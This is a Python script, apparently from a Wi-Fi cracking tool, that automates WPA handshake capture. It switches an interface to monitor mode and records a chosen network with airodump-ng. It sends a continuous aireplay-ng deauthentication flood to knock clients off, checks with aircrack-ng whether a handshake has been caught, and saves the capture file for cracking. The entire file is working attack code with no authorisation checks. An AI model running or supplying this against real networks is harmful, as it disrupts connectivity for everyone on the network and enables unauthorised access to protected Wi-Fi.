import subprocess
import threading
from pathlib import Path
from deauth import list_interface,start_monitor_mode,stop_monitor_mode,list_monitor_interface
from wifi_list import displayWifi
import os
import time
import signal
import sys
import shutil

def startDeauth(wifi,bssid):
        command = ["sudo","aireplay-ng","-0","0","-a",bssid,wifi]
        subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

def collectCapFile(wifiInterface):
    BDIR = (Path(__file__).resolve().parent)/"cap"
    BDIR.mkdir(parents=True, exist_ok=True)
    exiting = False
    collectedHash = False

    def handle_exit_signal(signal, frame):
        nonlocal exiting
        exiting = True
        print("\033[32mProcess exiting\033")
        mo_wivi = list_monitor_interface()
        stop_monitor_mode(mo_wivi)
        sys.exit(0)
    

    def saveCap():
        fileName = input("File name : ")
        dir_path = "./cap/saved_cap/"
        files = [f.split(".")[0] for f in os.listdir(dir_path)]
        if fileName in files:
            print("File name already taken")
            saveCap()
            return
        sourceFile = "./cap/capture-01.cap"
        shutil.copy(sourceFile,dir_path+fileName)


    def is_hashCreated(bssid):
        hash = BDIR/"capture-01.cap"
        if hash.exists():
            command = ["aircrack-ng", "-w","cap/demo.txt","-b",bssid,str(hash)]
            try:
                result = subprocess.run(command, capture_output=True, text=True,timeout=3)
            except:
                print("Some error occurred please (tip : change wifi modem and try again)")
                result = None
            if result and result.stdout.lower().find("master key") != -1 or exiting:
                if not exiting:
                    print("hash got it")
                    nonlocal collectedHash
                    collectedHash = True
                return True
        return False

    def startLesener(mac,channel,wifi):
        print(wifi,bssid,channel)
        command = [
            "sudo", "airodump-ng",
            "--bssid", mac,
            "--channel", str(channel),
            "-w", str(BDIR / "capture"),
            "--output-format", "pcap",
            wifi
        ]
        # stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        process = subprocess.Popen(command,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        while True:
            time.sleep(1)
            if is_hashCreated(bssid):
                process.terminate()  # Terminate the subprocess
                process.wait()     
                return
            
            
            
    def deleteCap():
        for file in BDIR.glob("*.cap"):
            os.remove(file)

    signal.signal(signal.SIGINT, handle_exit_signal)
    deleteCap()
    # wifiInterface = list_interface()
    # print(wifiInterface)
    # choice = int(input("Choose one wifi module : "))
    # wifiInterface = wifiInterface[choice]
    start_monitor_mode(wifiInterface)
    bssid,channel,name = displayWifi(wifiInterface)

    #start leasening
    leasener_thread = threading.Thread(target=startLesener,args=(bssid,channel,wifiInterface))
    leasener_thread.start()
    time.sleep(2)
    startDeauth(wifiInterface,bssid)
    leasener_thread.join()
    

    file_name = "./cap/capture-01.cap"
    if os.path.exists(file_name):
        choice = input("\n Are you willing to save cap file (Y/N): ")
        if choice in ["Y","y"]:
            saveCap()
    if collectedHash:
        return name
    return False
